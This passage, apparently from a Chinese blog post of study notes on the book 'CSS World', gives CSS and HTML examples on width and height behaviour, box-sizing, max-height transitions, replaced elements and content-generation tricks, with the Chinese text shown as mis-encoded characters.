class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* good */</span></span><br><span class="line"><span class="selector-class">.nav</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">10px</span>; </span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">9px</span> <span class="number">10px</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bad*/</span></span><br><span class="line"><span class="selector-class">.nav</span> &#123; </span><br><span class="line"> <span class="attribute">width</span>: <span class="number">240px</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="selector-class">.nav</span> <span class="selector-tag">a</span> &#123; </span><br><span class="line"> <span class="attribute">display</span>: block; </span><br><span class="line"> <span class="attribute">width</span>: <span class="number">200px</span>; </span><br><span class="line"> <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">10px</span>; </span><br><span class="line"> <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">10px</span>; </span><br><span class="line"> ... </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>é™¤éæœ‰æ˜ç¡®çš„è®¾ç½®ï¼Œå…ƒç´ éƒ½ä¸ä¼šä¸»åŠ¨è¶…è¿‡çˆ¶çº§å®¹å™¨å®½åº¦çš„ã€‚å¦‚ï¼šwidthè®¾ç½®ï¼Œå†…éƒ¨è¿ç»­å¾ˆé•¿çš„è‹±æ–‡æ•°å­—ï¼Œå†…è”å…ƒç´ è¢«è®¾ç½®ä¸º<code>white-space:nowrap</code></li></ul><h2 id="å†…éƒ¨å°ºå¯¸çš„3ç§è¡¨ç°å½¢å¼"><a href="#å†…éƒ¨å°ºå¯¸çš„3ç§è¡¨ç°å½¢å¼" class="headerlink" title="å†…éƒ¨å°ºå¯¸çš„3ç§è¡¨ç°å½¢å¼"></a>å†…éƒ¨å°ºå¯¸çš„3ç§è¡¨ç°å½¢å¼</h2><h3 id="1-åŒ…è£¹æ€§"><a href="#1-åŒ…è£¹æ€§" class="headerlink" title="1. åŒ…è£¹æ€§"></a>1. åŒ…è£¹æ€§</h3><p>æŒ‰é’®æ–‡å­—è¶Šå¤šï¼Œ<code>.contentå…ƒç´ </code>å®½åº¦è¶Šå®½ï¼ˆå†…éƒ¨å°ºå¯¸ç‰¹æ€§ï¼‰ã€‚ä½†å¦‚æœæ–‡å­—è¶³å¤Ÿå¤šï¼Œåˆ™ä¼šåœ¨å®¹å™¨æœ€å¤§å®½åº¦å¤„è‡ªåŠ¨æ¢è¡Œã€‚<br><a href="http://demo.cssworld.cn/3/2-5.php" target="_blank" rel="noopener">http://demo.cssworld.cn/3/2-5.php</a><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.box</span> &#123;</span></span><br><span class="line"><span class="undefined">  text-align: center;</span></span><br><span class="line"><span class="undefined">  width: 240px;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-class">.content</span> &#123;</span></span><br><span class="line"><span class="undefined">  display: inline-block;</span></span><br><span class="line"><span class="undefined">  text-align: left;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span>å†…å®¹<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="2-é¦–é€‰æœ€å°å®½åº¦"><a href="#2-é¦–é€‰æœ€å°å®½åº¦" class="headerlink" title="2. é¦–é€‰æœ€å°å®½åº¦"></a>2. é¦–é€‰æœ€å°å®½åº¦</h3><p>Qï¼šå‡è®¾.boxçš„width: 0ï¼Œ .contentçš„å®½åº¦ä¼šæ˜¯0å—ï¼Ÿå¯ä»¥çœ‹åˆ°å­—ä½“å—ï¼Ÿ<br>Aï¼šå®½åº¦ä¸ä¼šä¸º0ï¼Œå¯ä»¥çœ‹åˆ°å­—ä½“ï¼Œæ­¤æ—¶.contentçš„å®½åº¦ä¸ºâ€œé¦–é€‰æœ€å°å®½åº¦â€ã€‚æ±‰å­—æœ€å°å®½åº¦ or è¿ç»­çš„è‹±æ–‡å­—ç¬¦å•å…ƒã€‚<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css"><span class="selector-class">.box</span> &#123;</span></span><br><span class="line"><span class="undefined">  width: 0</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span>æ–‡å­—å†…å®¹<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="box-sizing"><a href="#box-sizing" class="headerlink" title="box-sizing"></a>box-sizing</h2><p>content box, padding box(ä»…fireFoxæ›¾ç»æ”¯æŒ), border box, margin box(ä¸æ”¯æŒ)<br>widthå’Œheightä½œç”¨äºå“ªä¸ªç›’å­ä¸Šã€‚</p><h3 id="å¦‚ä½•è¯„ä»·-box-sizing-border-box"><a href="#å¦‚ä½•è¯„ä»·-box-sizing-border-box" class="headerlink" title="å¦‚ä½•è¯„ä»·* { box-sizing: border-box }?"></a>å¦‚ä½•è¯„ä»·* { box-sizing: border-box }?</h3><ul><li>é€šé…ç¬¦*äº§ç”Ÿäº†æ²¡å¿…è¦çš„æ¶ˆè€—ã€‚</li><li>border-boxä¸èƒ½è§£å†³æ‰€æœ‰é—®é¢˜ï¼Œæ¨èå®½åº¦åˆ†ç¦»ï¼Œå¤–é¢åµŒå¥—<div>ï¼Œæ¨¡æ‹Ÿborderå’Œpadding</div></li><li>ä¸Šé¢å®½åº¦åˆ†ç¦»çš„æ–¹æ³•æœ‰å±€é™æ€§ï¼Œå¦‚æ— æ³•focus input, textareaçš„è¾¹æ¡†ï¼Œè¿™ä¸ªæ—¶å€™åªèƒ½ä½¿ç”¨border-boxï¼Œä¸‹é¢çš„cssé‡ç½®æ›´åŠ åˆç†ã€‚<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span>, <span class="selector-tag">textarea</span>, <span class="selector-tag">img</span>, <span class="selector-tag">video</span>, <span class="selector-tag">object</span> &#123; </span><br><span class="line"> <span class="attribute">box-sizing</span>: border-box; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="height-auto"><a href="#height-auto" class="headerlink" title="height: auto"></a>height: auto</h2><p>æŸå°ç™½æƒ³è¦åœ¨é¡µé¢æ’å…¥ä¸€ä¸ªdivï¼Œç„¶åæ»¡å±æ˜¾ç¤ºèƒŒæ™¯å›¾ï¼Œå†™ä¸‹äº†å¦‚ä¸‹CSSï¼Œä½†ä»–ä¼šå‘ç°è¿™ä¸ªdivçš„é«˜åº¦æ°¸è¿œæ˜¯0ã€‚<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>; <span class="comment">/* è¿™æ˜¯å¤šä½™çš„ */</span></span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>; <span class="comment">/* è¿™æ˜¯æ— æ•ˆçš„ */</span></span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">'bg.jpg'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>çˆ¶çº§æ²¡æœ‰å…·ä½“é«˜åº¦å€¼çš„æ—¶å€™ï¼Œ<code>height: auto</code>ä¼šæ— æ•ˆã€‚å¦‚ä½•è®©å…ƒç´ æ˜¾ç¤º<code>height: 100%</code>çš„æ•ˆæœâ€”â€”ä½¿ç”¨æ˜¾ç¤ºçš„é«˜åº¦å€¼ï¼Œæˆ–å¯ç”Ÿæ•ˆçš„ç™¾åˆ†æ¯”é«˜åº¦ï¼Œæˆ–è€…ä½¿ç”¨ç»å¯¹å®šä½<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">html</span>, <span class="selector-tag">body</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100vh</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>height: auto</code>ä½¿ç”¨<code>transition: height 1s</code>ä¸ä¼šèµ·ä½œç”¨ï¼Œä½†æ˜¯å¯ä»¥ç”¨<code>max-height</code>æ¥æ¨¡æ‹Ÿ</p><h2 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h2><p>æŒ‰ç…§ä»ä¸Šè€Œä¸‹ã€è‡ªå¤–è€Œå†…çš„é¡ºåºæ¸²æŸ“ DOM å†…å®¹ã€‚å¥—ç”¨æœ¬ä¾‹å°±æ˜¯ï¼Œ<br>å…ˆæ¸²æŸ“çˆ¶å…ƒç´ ï¼Œåæ¸²æŸ“å­å…ƒç´ ï¼Œæ˜¯æœ‰å…ˆåé¡ºåºçš„ã€‚å› æ­¤ï¼Œå½“æ¸²æŸ“åˆ°çˆ¶å…ƒç´ çš„æ—¶å€™ï¼Œå­å…ƒç´ çš„<br>width:100%å¹¶æ²¡æœ‰æ¸²æŸ“ï¼Œå®½åº¦å°±æ˜¯å›¾ç‰‡åŠ æ–‡å­—å†…å®¹çš„å®½åº¦ï¼›ç­‰æ¸²æŸ“åˆ°æ–‡å­—è¿™ä¸ªå­å…ƒç´ çš„æ—¶å€™ï¼Œ<br>çˆ¶å…ƒç´ å®½åº¦å·²ç»å›ºå®šï¼Œæ­¤æ—¶çš„ width:100%å°±æ˜¯å·²ç»å›ºå®šå¥½çš„çˆ¶å…ƒç´ çš„å®½åº¦ã€‚å®½åº¦ä¸å¤Ÿæ€ä¹ˆ<br>åŠï¼Ÿæº¢å‡ºå°±å¥½äº†ï¼Œoverflow å±æ€§å°±æ˜¯ä¸ºæ­¤è€Œç”Ÿçš„ã€‚</p><h2 id="ä»»æ„é«˜åº¦å…ƒç´ çš„å±•å¼€æ”¶èµ·åŠ¨ç”»"><a href="#ä»»æ„é«˜åº¦å…ƒç´ çš„å±•å¼€æ”¶èµ·åŠ¨ç”»" class="headerlink" title="ä»»æ„é«˜åº¦å…ƒç´ çš„å±•å¼€æ”¶èµ·åŠ¨ç”»"></a>ä»»æ„é«˜åº¦å…ƒç´ çš„å±•å¼€æ”¶èµ·åŠ¨ç”»</h2><p>heightçš„é»˜è®¤å€¼æ˜¯autoï¼Œä»0åˆ°autoæ˜¯æ— æ³•è®¡ç®—çš„ï¼Œå› æ­¤æ— æ³•å½¢æˆè¿‡æ¸¡çš„åŠ¨ç”»æ•ˆæœã€‚ä½†æ˜¯å¾ˆå¤šæ—¶å€™ï¼Œå±•å¼€çš„å…ƒç´ å†…å®¹æ˜¯åŠ¨æ€çš„ï¼Œé«˜åº¦æ˜¯ä¸å›ºå®šçš„ï¼Œä¸èƒ½å®šæ­»<code>height</code>ã€‚è¿™ä¸ªæ—¶å€™å¯ä»¥ç”¨<code>max-height</code>ï¼Œåªè¦ä¿è¯<code>max-height</code>è¦æ¯”å®é™…å†…å®¹çš„é«˜åº¦è¾¾å³å¯ã€‚<br>ï¼ˆä½†æ˜¯è¦æ³¨æ„ï¼Œmax-heightå€¼å¤ªå¤§ï¼Œæ”¶èµ·çš„æ—¶å€™ä¼šæœ‰å»¶è¿Ÿçš„æ•ˆæœï¼‰<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.element</span> &#123;</span><br><span class="line">  <span class="attribute">max-height</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  <span class="attribute">transition</span>: max-height .<span class="number">25s</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.element</span><span class="selector-class">.active</span> &#123;</span><br><span class="line">  <span class="attribute">max-height</span>: <span class="number">666px</span>; <span class="comment">/* ä¸€ä¸ªè¶³å¤Ÿå¤§çš„max-height */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="å†…è”å…ƒç´ "><a href="#å†…è”å…ƒç´ " class="headerlink" title="å†…è”å…ƒç´ "></a>å†…è”å…ƒç´ </h2><p>å†…è”å…ƒç´ çš„å†…è”ï¼Œç‰¹æŒ‡â€œå¤–åœ¨ç›’å­â€ï¼Œ<code>inline</code>, <code>inline-block</code>, <code>inline-table</code>éƒ½æ˜¯å†…è”å…ƒç´ ã€‚å†…è”å…ƒç´ çš„å…¸å‹ç‰¹å¾å°±æ˜¯å¯ä»¥å’Œæ–‡å­—åœ¨ä¸€è¡Œæ˜¾ç¤ºã€‚</p><h2 id="å¹½çµç©ºç™½èŠ‚ç‚¹"><a href="#å¹½çµç©ºç™½èŠ‚ç‚¹" class="headerlink" title="å¹½çµç©ºç™½èŠ‚ç‚¹"></a>å¹½çµç©ºç™½èŠ‚ç‚¹</h2><h1 id="4-ç›’å°ºå¯¸å››å¤§å®¶æ—"><a href="#4-ç›’å°ºå¯¸å››å¤§å®¶æ—" class="headerlink" title="4. ç›’å°ºå¯¸å››å¤§å®¶æ—"></a>4. ç›’å°ºå¯¸å››å¤§å®¶æ—</h1><h2 id="4-1-content-æ›¿æ¢å…ƒç´ "><a href="#4-1-content-æ›¿æ¢å…ƒç´ " class="headerlink" title="4.1 content æ›¿æ¢å…ƒç´ "></a>4.1 content æ›¿æ¢å…ƒç´ </h2><p>é€šè¿‡ä¿®æ”¹æŸä¸ªhtmlå±æ€§å€¼å°±å¯ä»¥ä¿®æ”¹å…ƒç´ å‘ˆç°å†…å®¹çš„å…ƒç´ ï¼Œè¢«ç§°ä¸º<strong>æ›¿æ¢å…ƒç´ </strong>ï¼Œå¦‚<code>&lt;img&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;video&gt;</code>, <code>&lt;iframe&gt;</code>, <code>&lt;input&gt;</code>, <code>&lt;textarea&gt;</code>ã€‚</p><p>æ›¿æ¢å…ƒç´ çš„å°ºå¯¸è®¡ç®—è§„åˆ™ï¼šCSSå°ºå¯¸ &gt; HTMLå°ºå¯¸ &gt; å›ºæœ‰å°ºå¯¸ã€‚å¦‚æœå›ºæœ‰å°ºå¯¸å«æœ‰å›ºå®šçš„å®½é«˜æ¯”ä¾‹ï¼ŒåŒæ—¶æˆ‘ä»¬ä»…è®¾ç½®äº†å®½åº¦æˆ–é«˜åº¦ï¼Œé‚£ä¹ˆå…ƒç´ ä¼šç­‰æ¯”æ˜¾ç¤ºã€‚</p><ul><li>å›ºæœ‰å°ºå¯¸ï¼šå†…å®¹åŸæœ¬çš„å°ºå¯¸</li><li>HTMLå°ºå¯¸ï¼šHTMLåŸç”Ÿå±æ€§ï¼Œå¦‚ä¸‹</li><li>CSSå°ºå¯¸: width, height, max-width/min-widthè®¾ç½®çš„å°ºå¯¸<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">size</span>=<span class="string">"30"</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">cols</span>=<span class="string">"20"</span> <span class="attr">rows</span>=<span class="string">"5&gt;&lt;/textarea&gt;</span></span></span><br></pre></td></tr></table></figure></li></ul><h2 id="4-2-å¦‚ä½•ç†è§£æ›¿æ¢å…ƒç´ -contentå±æ€§"><a href="#4-2-å¦‚ä½•ç†è§£æ›¿æ¢å…ƒç´ -contentå±æ€§" class="headerlink" title="4.2 å¦‚ä½•ç†è§£æ›¿æ¢å…ƒç´  contentå±æ€§"></a>4.2 å¦‚ä½•ç†è§£æ›¿æ¢å…ƒç´  contentå±æ€§</h2><p>åœ¨chromeæµè§ˆå™¨ä¸­ï¼Œæ‰€æœ‰çš„å…ƒç´ éƒ½æ”¯æŒcontentå±æ€§ã€‚æ²¡æœ‰srcå±æ€§çš„<img src="/2022/02/12/CSSä¸–ç•Œ/">æ˜¯éæ›¿æ¢å…ƒç´ ï¼Œè€ŒåŠ ä¸Šäº†contentå±æ€§ï¼Œåˆ™å˜æˆäº†æ›¿æ¢å…ƒç´ ã€‚<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* æ²¡æœ‰è®¾ç½®srcçš„imgå…ƒç´ éƒ½æ˜¾ç¤º 1.jpg */</span></span><br><span class="line"><span class="selector-tag">img</span><span class="selector-pseudo">:not(</span><span class="selector-attr">[src]</span>) &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="built_in">url</span>(<span class="string">'1.jpg'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>é€šè¿‡ä¿®æ”¹contentï¼Œå¯ä»¥ä¸ç”¨jså°±å®ç°imgå†…å®¹çš„æ›¿æ¢ã€‚ä½†æ˜¯è¦æ³¨æ„ï¼Œcontentå±æ€§åªæ”¹å˜è§†è§‰å‘ˆç°ï¼Œå½“æˆ‘ä»¬ä¿å­˜è¿™å¼ å›¾ç‰‡æ—¶ï¼Œä¿å­˜çš„è¿˜æ˜¯åŸæœ¬srcå¯¹åº”çš„å›¾ç‰‡ã€‚<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">img</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="built_in">url</span>(<span class="string">'2.jpg'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>æ›¿æ¢å…ƒç´ å’Œéæ›¿æ¢å…ƒç´ çš„è·ç¦»æœ‰å¤šè¿œï¼Ÿ<br>å°±æ˜¯srcæˆ–contentçš„è¿™ä¸€ç‚¹è·ç¦»ã€‚ä½†æ˜¯<code>contentå±æ€§</code>ç”Ÿæˆçš„æ–‡æœ¬æ˜¯æ— æ³•é€‰ä¸­ã€æ— æ³•å¤åˆ¶çš„ï¼Œè¿™å¯¹å¯è®¿é—®æ€§å’ŒSEOéƒ½å¾ˆä¸å‹å¥½ï¼Œ<code>contentå±æ€§</code>åªèƒ½ç”¨æ¥ç”Ÿæˆä¸€äº›æ— å…³ç´§è¦çš„å†…å®¹ï¼Œå¦‚è£…é¥°æ€§å›¾å½¢æˆ–åºå·ã€‚</p><p><br></p><h3 id="4-3-contentå†…å®¹ç”ŸæˆæŠ€æœ¯"><a href="#4-3-contentå†…å®¹ç”ŸæˆæŠ€æœ¯" class="headerlink" title="4.3 contentå†…å®¹ç”ŸæˆæŠ€æœ¯"></a>4.3 contentå†…å®¹ç”ŸæˆæŠ€æœ¯</h3><p><code>content</code>å±æ€§å‡ ä¹éƒ½ç”¨åœ¨<code>:before/:after</code>è¿™é‡Œä¸¤ä¸ªå¾®å…ƒç´ ä¸­ï¼Œåˆ©ç”¨å®ƒä»¬æ¥ç”Ÿæˆè¾…åŠ©å…ƒç´ ï¼Œå®ç°å›¾å½¢æ•ˆæœã€‚</p><h3 id="4-3-1-æ¸…é™¤æµ®åŠ¨"><a href="#4-3-1-æ¸…é™¤æµ®åŠ¨" class="headerlink" title="4.3.1 æ¸…é™¤æµ®åŠ¨"></a>4.3.1 æ¸…é™¤æµ®åŠ¨</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.element</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-2-å­—ä½“å›¾æ ‡"><a href="#4-3-2-å­—ä½“å›¾æ ‡" class="headerlink" title="4.3.2 å­—ä½“å›¾æ ‡"></a>4.3.2 å­—ä½“å›¾æ ‡</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">font-face</span> &#123; </span><br><span class="line"> <span class="attribute">font-family</span>: <span class="string">"myico"</span>; </span><br><span class="line"> <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">"/fonts/4/myico.eot"</span>); </span><br><span class="line"> <span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">"/fonts/4/myico.eot#iefix"</span>) <span class="built_in">format</span>(<span class="string">"embedded-opentype"</span>), </span><br><span class="line"> <span class="built_in">url</span>(<span class="string">"/fonts/4/myico.ttf"</span>) <span class="built_in">format</span>(<span class="string">"truetype"</span>), </span><br><span class="line"> <span class="built_in">url</span>(<span class="string">"/fonts/4/myico.woff"</span>) <span class="built_in">format</span>(<span class="string">"woff"</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.icon-home</span><span class="selector-pseudo">:before</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">16px</span>;</span><br><span class="line">  <span class="attribute">font-family</span>: <span class="string">'myico'</span>;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">'å®¶'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-3-æ ¹æ®imgæ ‡ç­¾ä¸Š-altå±æ€§ç”Ÿæˆå›¾ç‰‡æè¿°ä¿¡æ¯"><a href="#4-3-3-æ ¹æ®imgæ ‡ç­¾ä¸Š-altå±æ€§ç”Ÿæˆå›¾ç‰‡æè¿°ä¿¡æ¯" class="headerlink" title="4.3.3 æ ¹æ®imgæ ‡ç­¾ä¸Š altå±æ€§ç”Ÿæˆå›¾ç‰‡æè¿°ä¿¡æ¯"></a>4.3.3 æ ¹æ®imgæ ‡ç­¾ä¸Š altå±æ€§ç”Ÿæˆå›¾ç‰‡æè¿°ä¿¡æ¯</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">img</span><span class="selector-pseudo">::after</span> &#123; </span><br><span class="line">  <span class="attribute">content</span>: <span class="built_in">attr</span>(alt);</span><br><span class="line">  <span class="comment">/* </span></span><br><span class="line"><span class="comment">  è‡ªå®šä¹‰çš„HTMLå±æ€§ ä¹Ÿå¯ä»¥</span></span><br><span class="line"><span class="comment">  content: attr(data-title);</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>; </span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>; </span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(0,0,0,.5); </span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateY</span>(100%); </span><br><span class="line">  <span class="attribute">transition</span>: transform .<span class="number">2s</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="selector-tag">img</span><span class="selector-pseudo">:hover</span><span class="selector-pseudo">::after</span> &#123; </span><br><span class="line">  <span class="comment">/* hoveræ—¶ altä¿¡æ¯æ˜¾ç¤º */</span> </span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translateY</span>(0); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-4-csså®ç°åŠ¨æ€çš„åŠ è½½ä¸­"><a href="#4-3-4-csså®ç°åŠ¨æ€çš„åŠ è½½ä¸­" class="headerlink" title="4.3.4 csså®ç°åŠ¨æ€çš„åŠ è½½ä¸­.."></a>4.3.4 csså®ç°åŠ¨æ€çš„åŠ è½½ä¸­..</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">æ­£åœ¨åŠ è½½ä¸­&lt;dot&gt;...&lt;/dot&gt; </span><br><span class="line"><span class="selector-tag">dot</span> &#123; </span><br><span class="line"> <span class="attribute">display</span>: inline-block; </span><br><span class="line"> <span class="attribute">height</span>: <span class="number">1em</span>; </span><br><span class="line"> <span class="attribute">line-height</span>: <span class="number">1</span>; </span><br><span class="line"> <span class="attribute">text-align</span>: left; </span><br><span class="line"> <span class="attribute">vertical-align</span>: -.<span class="number">25em</span>; </span><br><span class="line"> <span class="attribute">overflow</span>: hidden; </span><br><span class="line">&#125; </span><br><span class="line"><span class="selector-tag">dot</span><span class="selector-pseudo">::before</span> &#123; </span><br><span class="line"> <span class="attribute">display</span>: block; </span><br><span class="line"> <span class="attribute">content</span>: <span class="string">'...\A..\A.'</span>; </span><br><span class="line"> <span class="attribute">white-space</span>: pre-wrap; </span><br><span class="line"> <span class="attribute">animation</span>: dot <span class="number">3s</span> infinite step-start both; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">@<span class="keyword">keyframes</span> dot &#123; </span><br><span class="line"> 33% &#123; <span class="attribute">transform</span>: <span class="built_in">translateY</span>(-2em); &#125; </span><br><span class="line"> 66% &#123; <span class="attribute">transform</span>: <span class="built_in">translateY</span>(-1em); &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-2-padding"><a href="#4-2-padding" class="headerlink" title="4.2 padding"></a>4.2 padding</h2><h3 id="4-2-1-å†…è”å…ƒç´ paddingå±‚å æ•ˆæœ"><a href="#4-2-1-å†…è”å…ƒç´ paddingå±‚å æ•ˆæœ" class="headerlink" title="4.2.1 å†…è”å…ƒç´ paddingå±‚å æ•ˆæœ"></a>4.2.1 å†…è”å…ƒç´ paddingå±‚å æ•ˆæœ</h3><p>å†…è”å…ƒç´ çš„paddingåœ¨å‚ç›´æ–¹å‘ï¼Œä¸å½±å“å…¶ä»–å…ƒç´ 